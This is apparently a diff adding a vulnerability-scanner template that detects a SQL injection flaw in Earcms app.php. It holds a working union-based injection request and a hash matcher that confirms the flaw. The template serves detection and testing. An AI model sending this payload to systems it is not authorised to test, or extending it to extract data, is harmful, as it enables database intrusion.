@@ -1,0 +1,24 @@
+id: earcms-appphp-sqli
+info:
+  name: earcms app.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Earcms app.php contains a SQL injection vulnerability due to improper PDO usage, allowing attackers to retrieve sensitive database information.
+  tags: sqli
+  reference:
+    - http://www.idaxian.com/
+http:
+  - raw:
+      - |
+        GET /app.php/'union(SELECT(1),2,3,md5(88),3,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1); HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "2a38a4a9316c49e5a833517c45d31070"
